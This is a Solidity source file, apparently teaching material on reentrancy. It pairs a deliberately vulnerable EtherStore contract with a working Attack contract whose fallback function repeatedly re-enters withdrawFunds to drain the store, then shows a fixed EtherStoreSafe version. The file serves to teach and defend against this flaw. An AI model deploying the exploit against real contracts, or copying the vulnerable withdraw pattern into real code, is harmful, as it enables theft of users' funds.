 contract EtherStore {

      uint256 public withdrawalLimit = 1 ether;
      mapping(address => uint256) public lastWithdrawTime;
      mapping(address => uint256) public balances;

      function depositFunds() public payable {
           balances[msg.sender] += msg.value;
      }

      function withdrawFunds (uint256 _weiToWithdraw) public {
           require(balances[msg.sender] >= _weiToWithdraw);
           // limit the withdrawal
           require(_weiToWithdraw <= withdrawalLimit);
           // limit the time allowed to withdraw
           require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
           require(msg.sender.call.value(_weiToWithdraw)());
           balances[msg.sender] -= _weiToWithdraw;
           lastWithdrawTime[msg.sender] = now;
      }
 }

import "EtherStore.sol";

contract Attack {
    EtherStore public etherStore;

    // intialize the etherStore variable with the contract address
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attackEtherStore() public payable {
        // attack to the nearest ether
        require(msg.value >= 1 ether);
        // send eth to the depositFunds() function
        etherStore.depositFunds.value(1 ether)();
        // start the magic
        etherStore.withdrawFunds(1 ether);
    }

    function collectEther() public {
        msg.sender.transfer(this.balance);
    }

    // fallback function - where the magic happens
    function () payable {
      if (etherStore.balance > 1 ether) {
        etherStore.withdrawFunds(1 ether);
      }
    }
 }

 contract EtherStoreSafe {

  // initialize the mutex
  bool reEntrancyMutex = false;  // 1
  uint256 public withdrawalLimit = 1 ether;
  mapping(address => uint256) public lastWithdrawTime;
  mapping(address => uint256) public balances;

  function depositFunds() public payable {
       balances[msg.sender] += msg.value;
  }

  function withdrawFunds (uint256 _weiToWithdraw) public {
       require(!reEntrancyMutex);
       require(balances[msg.sender] >= _weiToWithdraw);
       // limit the withdrawal
       require(_weiToWithdraw <= withdrawalLimit);
       // limit the time allowed to withdraw
       require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
       balances[msg.sender] -= _weiToWithdraw;
       lastWithdrawTime[msg.sender] = now;
       // set the reEntrancy mutex before the external call
       reEntrancyMutex = true;
       msg.sender.transfer(_weiToWithdraw);  // 2/3 call last, use transfer
       // release the mutex after the external call
       reEntrancyMutex = false;
  }
}